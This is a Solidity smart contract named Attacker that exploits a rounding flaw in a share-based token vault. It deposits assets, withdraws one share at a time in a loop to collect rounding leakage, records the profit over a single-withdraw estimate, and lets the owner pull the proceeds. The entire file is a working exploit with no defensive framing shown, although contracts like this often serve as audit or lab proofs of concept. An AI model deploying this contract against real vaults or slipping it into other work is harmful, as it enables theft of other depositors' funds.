// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IVault {
    function deposit(uint256 assets) external returns (uint256 shares);
    function withdraw(uint256 shares) external returns (uint256 assetsOut);
    function balanceOf(address user) external view returns (uint256);
    function previewWithdraw(uint256 shares) external view returns (uint256);
}

contract Attacker {
    using SafeERC20 for IERC20;

    address public immutable owner;
    address public immutable token;
    address public immutable vault;

    uint256 public lastSharesMinted;
    uint256 public lastSingleWithdrawEstimate;
    uint256 public lastWithdrawReceived;
    uint256 public lastProfit;
    uint256 public lastRoundingLeak;

    event AttackExecuted(
        uint256 sharesMinted,
        uint256 singleWithdrawEstimate,
        uint256 withdrawReceived,
        uint256 roundingLeak,
        uint256 profit
    );

    constructor(address _token, address _vault) {
        require(_token != address(0), "ZERO_TOKEN");
        require(_vault != address(0), "ZERO_VAULT");

        owner = msg.sender;
        token = _token;
        vault = _vault;

        IERC20(_token).forceApprove(_vault, type(uint256).max);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function attack(uint256 assetsToDeposit, uint256 loopCount) external onlyOwner {
        require(assetsToDeposit > 0, "ZERO_DEPOSIT");
        require(loopCount > 0, "ZERO_LOOPS");

        uint256 balanceBefore = IERC20(token).balanceOf(address(this));

        IVault(vault).deposit(assetsToDeposit);

        uint256 sharesOwned = IVault(vault).balanceOf(address(this));
        require(sharesOwned > 0, "NO_SHARES");

        uint256 singleEstimate = IVault(vault).previewWithdraw(sharesOwned);

        uint256 withdrawn = 0;
        uint256 loops = loopCount;

        if (loops > sharesOwned) {
            loops = sharesOwned;
        }

        for (uint256 i = 0; i < loops; i++) {
            withdrawn += IVault(vault).withdraw(1);
        }

        uint256 remaining = IVault(vault).balanceOf(address(this));

        if (remaining > 0) {
            withdrawn += IVault(vault).withdraw(remaining);
        }

        uint256 balanceAfter = IERC20(token).balanceOf(address(this));

        uint256 profit =
            balanceAfter > balanceBefore
                ? balanceAfter - balanceBefore
                : 0;

        uint256 leak =
            withdrawn > singleEstimate
                ? withdrawn - singleEstimate
                : 0;

        lastSharesMinted = sharesOwned;
        lastSingleWithdrawEstimate = singleEstimate;
        lastWithdrawReceived = withdrawn;
        lastProfit = profit;
        lastRoundingLeak = leak;

        emit AttackExecuted(
            sharesOwned,
            singleEstimate,
            withdrawn,
            leak,
            profit
        );
    }

    function withdrawProfit() external onlyOwner {
        uint256 amount = IERC20(token).balanceOf(address(this));

        if (amount > 0) {
            IERC20(token).safeTransfer(owner, amount);
        }
    }
}
